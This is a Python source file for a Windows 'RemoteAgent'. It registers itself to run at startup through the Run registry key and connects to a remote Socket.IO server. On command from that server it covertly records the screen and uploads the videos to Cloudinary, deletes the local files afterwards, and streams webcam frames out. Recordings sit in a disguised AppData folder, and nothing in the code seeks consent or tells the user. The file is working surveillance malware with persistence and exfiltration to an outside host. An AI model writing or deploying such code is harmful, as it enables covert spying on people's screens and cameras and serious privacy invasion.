import socketio
import cv2
import numpy as np
import pyautogui
import os
import threading
import base64
import time
import cloudinary
import cloudinary.uploader
from datetime import datetime
import sys

try:
    import winreg
except ImportError:
    winreg = None

BASE_DIR = os.path.dirname(sys.executable) if getattr(sys, "frozen", False) else os.path.dirname(__file__)
LOG_FILE = os.path.join(BASE_DIR, "socket_error.txt")
RUN_REGISTRY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUN_REGISTRY_NAME = "RemoteAgent"

def log_error(message):
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(f"{datetime.now()}: {message}\n")


def load_local_env():
    env_candidates = [
        os.path.join(BASE_DIR, ".env"),
        os.path.join(os.path.dirname(BASE_DIR), ".env"),
        os.path.join(os.getcwd(), ".env"),
    ]

    for env_path in env_candidates:
        if not os.path.exists(env_path):
            continue

        try:
            with open(env_path, "r", encoding="utf-8") as file:
                for line in file:
                    raw = line.strip()
                    if not raw or raw.startswith("#") or "=" not in raw:
                        continue
                    key, value = raw.split("=", 1)
                    os.environ.setdefault(key.strip(), value.strip())
            return
        except Exception as error:
            log_error(f"Failed to load .env from {env_path}: {error}")


def get_autostart_command():
    if getattr(sys, "frozen", False):
        return f'"{os.path.abspath(sys.executable)}"'

    script_path = os.path.abspath(__file__)
    return f'"{sys.executable}" "{script_path}"'


def ensure_autostart_enabled():
    if os.name != "nt" or winreg is None:
        return

    launch_command = get_autostart_command()

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_REGISTRY_PATH, 0, winreg.KEY_READ) as key:
            existing_command, _ = winreg.QueryValueEx(key, RUN_REGISTRY_NAME)
            if existing_command == launch_command:
                return
    except OSError:
        pass

    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, RUN_REGISTRY_PATH) as key:
            winreg.SetValueEx(key, RUN_REGISTRY_NAME, 0, winreg.REG_SZ, launch_command)
        log_error(f"Autostart enabled with command: {launch_command}")
    except Exception as error:
        log_error(f"Failed to enable autostart: {error}")


load_local_env()
ensure_autostart_enabled()

# --- CONFIGURATION ---
DEFAULT_SERVER_URL = "https://remote-agent-node.onrender.com"
SERVER_URL = os.getenv("SERVER_URL", DEFAULT_SERVER_URL)
RECORDING_DIR = os.path.join(os.getenv("APPDATA", os.getcwd()), "WinVideoLogs")
FPS = 8.0
RECONNECT_DELAY_SECONDS = 5
CLOUDINARY_CLOUD_NAME = os.getenv("CLOUDINARY_CLOUD_NAME")
CLOUDINARY_API_KEY = os.getenv("CLOUDINARY_API_KEY")
CLOUDINARY_API_SECRET = os.getenv("CLOUDINARY_API_SECRET")
MACHINE_NAME = os.getenv("AGENT_NAME") or os.getenv("COMPUTERNAME", "Unknown-PC")

# Cloudinary Setup (Get these from your Cloudinary Dashboard)
if CLOUDINARY_CLOUD_NAME and CLOUDINARY_API_KEY and CLOUDINARY_API_SECRET:
    cloudinary.config(
        cloud_name=CLOUDINARY_CLOUD_NAME,
        api_key=CLOUDINARY_API_KEY,
        api_secret=CLOUDINARY_API_SECRET
    )
# ---------------------

sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=2, reconnection_delay_max=10)
is_recording = False
is_camera_on = False
recording_lock = threading.Lock()
camera_lock = threading.Lock()

if not os.path.exists(RECORDING_DIR):
    os.makedirs(RECORDING_DIR)


def emit_agent_state(source=""):
    try:
        sio.emit('agent_state_update', {
            'recording': bool(is_recording),
            'cameraOn': bool(is_camera_on),
            'machine': MACHINE_NAME,
            'source': source,
            'timestamp': int(time.time() * 1000)
        })
    except Exception as error:
        log_error(f"Failed to emit agent state ({source}): {error}")


def build_playable_video_url(upload_response):
    secure_url = upload_response.get("secure_url")
    if not secure_url:
        return None

    upload_marker = "/video/upload/"
    if upload_marker not in secure_url:
        return secure_url

    return secure_url.replace(upload_marker, "/video/upload/f_mp4,vc_h264/", 1)

def upload_to_cloudinary(file_path):
    """Uploads the video and sends the URL back to the server."""
    if not (CLOUDINARY_CLOUD_NAME and CLOUDINARY_API_KEY and CLOUDINARY_API_SECRET):
        message = "Cloudinary credentials missing. Skipping upload."
        print(message)
        log_error(message)
        return

    try:
        print(f"Uploading {file_path} to Cloudinary...")
        log_error(f"Uploading to Cloudinary: {file_path}")
        response = cloudinary.uploader.upload(file_path, resource_type="video")
        video_url = build_playable_video_url(response) or response.get("secure_url")
        print(f"Upload Success: {video_url}")
        log_error(f"Upload success: {video_url}")
        
        # Notify the backend that a new video is ready
        sio.emit('video_upload_complete', {'url': video_url, 'machine': MACHINE_NAME})
        
        # Cleanup local file to save space
        os.remove(file_path)
        log_error(f"Local file removed after upload: {file_path}")
    except Exception as e:
        print(f"Cloudinary Error: {e}")
        log_error(f"Cloudinary Error: {e}")

def record_loop():
    global is_recording
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_path = os.path.join(RECORDING_DIR, f"rec_{timestamp}.mp4")
    out = None
    should_upload = False

    try:
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(file_path, fourcc, FPS, screen_size)
        if not out.isOpened():
            log_error(f"VideoWriter failed to open: {file_path}")
            return

        should_upload = True
        log_error(f"Recording started: {file_path}")
        while is_recording:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(1/FPS)
    except Exception as error:
        log_error(f"Recording loop error: {error}")
    finally:
        if out is not None:
            out.release()
        is_recording = False
        emit_agent_state('record_loop_stopped')
        log_error(f"Recording stopped: {file_path}")
        # Trigger upload in background
        if should_upload and os.path.exists(file_path):
            threading.Thread(target=upload_to_cloudinary, args=(file_path,), daemon=True).start()
        else:
            log_error(f"Upload skipped, recording file missing: {file_path}")

def camera_stream_loop():
    global is_camera_on
    cap = cv2.VideoCapture(0)
    try:
        log_error("Camera stream started")
        while is_camera_on:
            ret, frame = cap.read()
            if not ret: break
            frame = cv2.resize(frame, (640, 480))
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
            sio.emit('camera_frame', {'image': jpg_as_text})
            time.sleep(0.1)
    except Exception as error:
        log_error(f"Camera loop error: {error}")
    finally:
        cap.release()
        is_camera_on = False
        emit_agent_state('camera_loop_stopped')
        log_error("Camera stream stopped")


@sio.event
def connect():
    log_error(f"Connected to {SERVER_URL}")
    sio.emit('register_node', {'machine': MACHINE_NAME})
    emit_agent_state('connected')


@sio.event
def disconnect():
    log_error("Disconnected from server")

@sio.on('start_capture')
def on_start(data=None):
    global is_recording
    with recording_lock:
        if not is_recording:
            is_recording = True
            log_error("start_capture received")
            threading.Thread(target=record_loop, daemon=True).start()
    emit_agent_state('start_capture')

@sio.on('stop_capture')
def on_stop(data=None):
    global is_recording
    log_error("stop_capture received")
    is_recording = False
    emit_agent_state('stop_capture')

@sio.on('start_camera')
def on_camera_start(data=None):
    global is_camera_on
    with camera_lock:
        if not is_camera_on:
            is_camera_on = True
            log_error("start_camera received")
            threading.Thread(target=camera_stream_loop, daemon=True).start()
    emit_agent_state('start_camera')

@sio.on('stop_camera')
def on_camera_stop(data=None):
    global is_camera_on
    log_error("stop_camera received")
    is_camera_on = False
    emit_agent_state('stop_camera')

if __name__ == "__main__":
    while True:
        try:
            sio.connect(SERVER_URL, wait_timeout=10)
            sio.wait()
        except Exception as e:
            log_error(f"Connection error: {e}")

        time.sleep(RECONNECT_DELAY_SECONDS)
